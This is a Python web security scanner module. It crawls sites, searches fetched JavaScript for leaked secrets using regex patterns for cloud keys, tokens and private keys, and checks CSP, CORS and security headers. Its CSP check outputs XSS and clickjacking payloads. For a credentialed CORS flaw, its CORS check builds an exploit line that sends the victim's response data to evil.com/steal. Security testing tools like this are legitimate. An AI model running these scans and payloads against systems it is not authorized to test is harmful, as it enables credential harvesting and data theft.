"""
TeamCyberOps Suite v4 — Security Analysis Tools (Production Grade)
JS Analyzer · Endpoint Extractor · CSP Analyzer · CORS Checker · Header Analysis
"""
import re, json, urllib.request, urllib.parse, socket, threading, concurrent.futures
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).parent.parent.parent

# ══════ JS ANALYZER ══════════════════════════════════════════════
JS_SECRET_PATTERNS = {
    "AWS Access Key":    r'AKIA[0-9A-Z]{16}',
    "AWS Secret":        r'(?i)aws.{0,15}(?:secret|key).{0,5}["\'][0-9a-zA-Z/+]{40}["\']',
    "Google API Key":    r'AIza[0-9A-Za-z\-_]{35}',
    "GitHub Token":      r'gh[pousr]_[A-Za-z0-9_]{36}',
    "GitHub Classic":    r'ghp_[A-Za-z0-9]{36}',
    "Slack Token":       r'xox[baprs]-[0-9a-zA-Z\-]{10,48}',
    "Slack Webhook":     r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+',
    "Discord Webhook":   r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+',
    "Stripe Key":        r'(?:r|s)k_(?:live|test)_[0-9a-zA-Z]{24}',
    "Stripe Webhook":    r'whsec_[a-zA-Z0-9]{32,}',
    "Twilio Key":        r'SK[0-9a-fA-F]{32}',
    "SendGrid Key":      r'SG\.[a-zA-Z0-9\-_]{22,}\.[a-zA-Z0-9\-_]{43,}',
    "JWT Token":         r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    "Private Key":       r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
    "SSH Private Key":   r'-----BEGIN OPENSSH PRIVATE KEY-----',
    "Generic API Key":   r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\`\']{0,1}([A-Za-z0-9_\-]{20,})',
    "Generic Secret":    r'(?i)(?:secret|secret_key)\s*[:=]\s*["\`\']{0,1}([A-Za-z0-9_\-]{16,})',
    "Generic Token":     r'(?i)(?:access_token|auth_token)\s*[:=]\s*["\`\']{0,1}([A-Za-z0-9_\-\.]{20,})',
    "Password in Code":  r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^\s"\']{6,50})["\']',
    "Database URL":      r'(?:mysql|postgres|mongodb|redis|postgresql)://[^\s"\'<>]{10,}',
    "Internal IP":       r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
    "Firebase URL":      r'https://[a-z0-9-]+\.firebaseio\.com',
    "Heroku API Key":    r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
    "npm Token":         r'//registry\.npmjs\.org/:_authToken=[A-Za-z0-9_-]{36}',
    "Mailgun Key":       r'key-[0-9a-zA-Z]{32}',
    "Mapbox Token":      r'pk\.[A-Za-z0-9_-]{50,}',
    "Okta Domain":       r'[a-zA-Z0-9-]+\.okta\.com',
    "Salesforce Token":  r'(?i)salesforce.{0,20}["\'][A-Za-z0-9]{40,}["\']',
    "Telegram Bot":      r'\d+:[A-Za-z0-9_-]{35}',
    "Auth0 Domain":      r'[a-zA-Z0-9-]+\.auth0\.com',
    "Azure SAS":         r'sv=\d{4}-\d{2}-\d{2}&[^"\'&\s]{20,}sig=[A-Za-z0-9%+/]{20,}',
}

JS_DANGEROUS = {
    "eval()":                r'\beval\s*\(',
    "innerHTML":             r'\.innerHTML\s*=',
    "outerHTML":             r'\.outerHTML\s*=',
    "document.write":        r'document\.write\s*\(',
    "setTimeout(string)":    r'setTimeout\s*\(\s*["\']',
    "Function()":            r'new\s+Function\s*\(',
    "dangerouslySetInnerHTML": r'dangerouslySetInnerHTML',
    "postMessage":           r'\.postMessage\s*\(',
    "cookie write":          r'document\.cookie\s*=',
    "location.href=":        r'(?:location\.href|window\.location)\s*=',
    "open() redirect":       r'window\.open\s*\(',
    "WebSocket":             r'new\s+WebSocket\s*\(',
    "XMLHttpRequest":        r'new\s+XMLHttpRequest',
    "Storage write":         r'(?:localStorage|sessionStorage)\.setItem',
}

def analyze_js(code, filename="unknown.js"):
    results = {
        "filename":  filename,
        "lines":     code.count('\n') + 1,
        "size_bytes": len(code.encode()),
        "secrets":   [],
        "dangerous_functions": [],
        "endpoints": [],
        "external_urls": [],
        "summary": {}
    }
    # Secrets
    for name, pattern in JS_SECRET_PATTERNS.items():
        try:
            for m in re.finditer(pattern, code):
                line_no = code[:m.start()].count('\n') + 1
                val = m.group()[:100]
                # Skip obvious test/example values
                if any(x in val.lower() for x in ["example","test","your","sample","placeholder"]): continue
                results["secrets"].append({
                    "type": name, "value": val, "line": line_no,
                    "severity": "CRITICAL" if any(k in name for k in
                        ["Private Key","AWS Secret","Password","Token","API Key"]) else "HIGH"
                })
        except Exception: pass

    # Dangerous functions
    for name, pattern in JS_DANGEROUS.items():
        try:
            for m in re.finditer(pattern, code):
                line_no = code[:m.start()].count('\n') + 1
                ctx = code[max(0,m.start()-20):m.end()+50].strip()
                results["dangerous_functions"].append({"func":name,"line":line_no,"context":ctx[:100]})
        except Exception: pass

    # API Endpoints
    ep_patterns = [
        r'(?:fetch|axios\.[a-z]+|request)\(["\']([^"\'?#]{5,80})["\']',
        r'(?:url|endpoint|path|route)\s*[:=]\s*["\'](/[^"\'?#]{3,80})["\']',
        r'"(/(?:api|v\d+|rest|graphql|auth|user|account|admin)[^"]{2,60})"',
    ]
    ep_set = set()
    for pat in ep_patterns:
        for m in re.finditer(pat, code, re.I):
            ep = m.group(1)
            if len(ep) > 3 and not ep.endswith((".css",".js",".png",".jpg")):
                ep_set.add(ep)
    results["endpoints"] = sorted(ep_set)

    # External URLs
    ext_urls = set()
    for m in re.finditer(r'https?://[^\s"\'`<>]{10,200}', code):
        url = m.group()
        if not any(x in url for x in ["localhost","127.0.0.1"]): ext_urls.add(url)
    results["external_urls"] = sorted(ext_urls)[:50]

    results["summary"] = {
        "total_secrets":    len(results["secrets"]),
        "critical_secrets": len([s for s in results["secrets"] if s["severity"]=="CRITICAL"]),
        "dangerous_calls":  len(results["dangerous_functions"]),
        "endpoints_found":  len(results["endpoints"]),
        "risk": "CRITICAL" if results["secrets"] else "HIGH" if results["dangerous_functions"] else "LOW"
    }
    return results

def fetch_and_analyze_js(url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=12) as r:
            code = r.read(1000000).decode("utf-8","replace")
        result = analyze_js(code, url.split("/")[-1])
        if result["secrets"]:
            log(f"[JS] {len(result['secrets'])} secrets in {url.split('/')[-1]}", "ok")
        return result
    except Exception as e:
        log(f"[JS] Error {url}: {str(e)[:40]}", "err")
        return None

# ══════ ENDPOINT EXTRACTOR ═══════════════════════════════════════
def extract_endpoints(url, depth=2, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    log(f"[Endpoints] Crawling {url}", "info")
    from urllib.parse import urljoin, urlparse
    visited = set(); endpoints = set(); forms = []; js_files = set()
    base_domain = urlparse(url).netloc

    def _crawl(target_url, current_depth):
        if current_depth > depth or target_url in visited: return
        visited.add(target_url)
        try:
            req = urllib.request.Request(target_url, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read(50000).decode("utf-8","replace")
            # Links
            for href in re.findall(r'href=["\']([^"\']+)["\']', body):
                abs_url = urljoin(target_url, href)
                if urlparse(abs_url).netloc == base_domain:
                    endpoints.add(abs_url)
                    if current_depth < depth: _crawl(abs_url, current_depth+1)
            # JS files
            for src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body):
                js_files.add(urljoin(target_url, src))
            # Forms
            for form in re.finditer(r'<form[^>]*>(.*?)</form>', body, re.I|re.S):
                action_m = re.search(r'action=["\']([^"\']+)["\']', form.group())
                method_m = re.search(r'method=["\']([^"\']+)["\']', form.group())
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form.group())
                forms.append({
                    "url":    target_url,
                    "action": urljoin(target_url, action_m.group(1)) if action_m else target_url,
                    "method": method_m.group(1).upper() if method_m else "GET",
                    "inputs": inputs,
                })
        except Exception: pass

    _crawl(url, 0)
    # Analyze JS
    js_results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        futs = {ex.submit(fetch_and_analyze_js, js, log): js for js in list(js_files)[:20]}
        for fut in concurrent.futures.as_completed(futs, timeout=60):
            r = fut.result()
            if r: js_results.append(r); endpoints.update(r.get("endpoints",[]))

    result = {
        "url":       url,
        "endpoints": sorted(endpoints),
        "forms":     forms,
        "js_files":  list(js_files),
        "js_analysis": js_results,
        "interesting": [e for e in endpoints if any(k in e.lower() for k in
            ["admin","api","auth","login","upload","config","debug","secret","key","token"])],
    }
    log(f"[Endpoints] {len(endpoints)} endpoints, {len(forms)} forms, {len(js_files)} JS files", "ok")
    return result

# ══════ CSP ANALYZER ═════════════════════════════════════════════
CSP_ISSUES = {
    "unsafe-inline":        ("Allows inline scripts/styles — XSS risk",      "HIGH"),
    "unsafe-eval":          ("Allows eval() — code injection risk",            "HIGH"),
    "unsafe-hashes":        ("Allows hash-based unsafe inline",                "MEDIUM"),
    "data:":                ("Allows data: URIs — XSS bypass possible",        "MEDIUM"),
    "*":                    ("Wildcard source — allows any domain",             "HIGH"),
    "http:":                ("Allows HTTP (non-HTTPS) content",                "MEDIUM"),
    "'unsafe-inline'":      ("Inline scripts allowed",                         "HIGH"),
    "script-src *":         ("Wildcard script-src",                            "CRITICAL"),
    "default-src *":        ("Wildcard default-src",                           "CRITICAL"),
}

def analyze_csp(url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            headers = dict(r.headers)
    except Exception as e:
        log(f"[CSP] Error: {e}", "err"); return {"error": str(e)}

    csp = headers.get("Content-Security-Policy","") or headers.get("content-security-policy","")
    xfo = headers.get("X-Frame-Options","") or headers.get("x-frame-options","")
    hsts = headers.get("Strict-Transport-Security","") or headers.get("strict-transport-security","")
    xcto = headers.get("X-Content-Type-Options","") or headers.get("x-content-type-options","")
    rp   = headers.get("Referrer-Policy","") or headers.get("referrer-policy","")
    pp   = headers.get("Permissions-Policy","") or headers.get("permissions-policy","")

    issues = []
    if not csp:
        issues.append({"type":"Missing CSP","severity":"HIGH","detail":"No Content-Security-Policy header"})
        log("[CSP] MISSING — no Content-Security-Policy", "ok")
    else:
        for pattern, (desc, sev) in CSP_ISSUES.items():
            if pattern in csp:
                issues.append({"type":f"CSP: {pattern}","severity":sev,"detail":desc,"value":csp[:200]})
                log(f"  [CSP] {sev}: {desc}", "ok" if sev=="CRITICAL" else "warn")

    if not xfo: issues.append({"type":"Missing X-Frame-Options","severity":"MEDIUM","detail":"Clickjacking possible"})
    if not hsts: issues.append({"type":"Missing HSTS","severity":"MEDIUM","detail":"HTTPS not enforced"})
    if not xcto: issues.append({"type":"Missing X-Content-Type-Options","severity":"LOW","detail":"MIME sniffing possible"})
    if not rp:   issues.append({"type":"Missing Referrer-Policy","severity":"LOW","detail":"Referrer leakage"})
    if not pp:   issues.append({"type":"Missing Permissions-Policy","severity":"LOW","detail":"Browser feature policy"})

    # Bypass suggestions
    bypasses = []
    if "unsafe-inline" in csp or not csp:
        bypasses.append("<script>alert(1)</script>")
        bypasses.append("<img src=x onerror=alert(1)>")
    if "*.cloudflare.com" in csp or "*.googleapis.com" in csp:
        bypasses.append("JSONP bypass: use allowed CDN as script source")
    if not xfo:
        bypasses.append('<iframe src="' + url + '"></iframe>  — clickjacking PoC')

    return {
        "url": url,
        "csp": csp or "NOT SET",
        "x_frame_options": xfo or "NOT SET",
        "hsts": hsts or "NOT SET",
        "x_content_type": xcto or "NOT SET",
        "referrer_policy": rp or "NOT SET",
        "permissions_policy": pp or "NOT SET",
        "issues": issues,
        "bypasses": bypasses,
        "score": max(0, 10 - len([i for i in issues if i["severity"] in ("HIGH","CRITICAL")])*2 - len([i for i in issues if i["severity"]=="MEDIUM"])),
    }

# ══════ CORS ANALYZER ════════════════════════════════════════════
def analyze_cors(url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    log(f"[CORS] Testing {url}", "info")
    results = []
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{urllib.parse.urlparse(url).netloc}",
        f"https://{urllib.parse.urlparse(url).netloc}.evil.com",
        f"https://evil.com.{urllib.parse.urlparse(url).netloc}",
        "https://localhost",
        "file://",
    ]
    for origin in test_origins:
        try:
            req = urllib.request.Request(url, headers={
                "Origin":urllib.parse.urlparse(url).scheme+"://"+origin if not origin.startswith("http") else origin,
                "User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=8) as r:
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")
        except urllib.error.HTTPError as e:
            acao = e.headers.get("Access-Control-Allow-Origin","")
            acac = e.headers.get("Access-Control-Allow-Credentials","")
        except Exception: continue

        if not acao: continue
        issue = None
        if acao == "*": issue = "Wildcard — any origin (but credentials won't work)"
        elif acao == origin and "evil" in origin.lower(): issue = f"Reflected arbitrary origin: {origin}"
        elif acao == "null": issue = "null origin accepted"

        if issue:
            critical = acac.lower() == "true" and acao != "*"
            results.append({
                "origin_tested":  origin,
                "acao":           acao,
                "credentials":    acac,
                "issue":          issue,
                "severity":       "CRITICAL" if critical else "HIGH",
                "exploit":        (f'fetch("{url}",{{credentials:"include"}}).then(r=>r.text())'
                                   f'.then(d=>fetch("https://evil.com/steal?d="+btoa(d)))') if critical else None,
            })
            log(f"  [CORS] {'CRITICAL' if critical else 'HIGH'}: {issue}", "ok")

    if not results: log("[CORS] No issues detected", "dim")
    return {"url":url,"findings":results,"vulnerable":len(results)>0}

# ══════ HTTP HEADER ANALYZER ═════════════════════════════════════
def analyze_headers(url, log_cb=None):
    log = log_cb or (lambda m,t='': None)
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            status = r.status
            headers = dict(r.headers)
    except Exception as e:
        log(f"[Headers] Error: {e}", "err"); return {}

    analysis = {"url":url,"status":status,"headers":headers,"issues":[],"server_info":{}}

    # Extract server info
    server = headers.get("Server","") or headers.get("server","")
    powered = headers.get("X-Powered-By","") or headers.get("x-powered-by","")
    if server: analysis["server_info"]["server"] = server; log(f"  [+] Server: {server}", "info")
    if powered: analysis["server_info"]["powered_by"] = powered; log(f"  [+] X-Powered-By: {powered}", "warn")

    # Version disclosure
    for val in [server, powered]:
        if re.search(r'\d+\.\d+', val):
            analysis["issues"].append({"type":"Version Disclosure","value":val,"severity":"LOW"})
            log(f"  [!] Version disclosed: {val}", "warn")

    # Missing security headers
    required = {
        "Strict-Transport-Security": "HIGH",
        "Content-Security-Policy":   "HIGH",
        "X-Frame-Options":           "MEDIUM",
        "X-Content-Type-Options":    "LOW",
        "Referrer-Policy":           "LOW",
        "Permissions-Policy":        "LOW",
    }
    for h, sev in required.items():
        if not any(k.lower() == h.lower() for k in headers):
            analysis["issues"].append({"type":f"Missing {h}","severity":sev})

    # Sensitive headers
    sensitive = ["Authorization","Cookie","Set-Cookie","X-Auth-Token","X-API-Key","X-Secret"]
    for h in sensitive:
        if any(k.lower() == h.lower() for k in headers):
            val = headers.get(h, headers.get(h.lower(),""))
            analysis["issues"].append({"type":f"Sensitive header: {h}","value":val[:30],"severity":"INFO"})

    log(f"[Headers] {len(analysis['issues'])} issues", "ok" if analysis['issues'] else "dim")
    return analysis
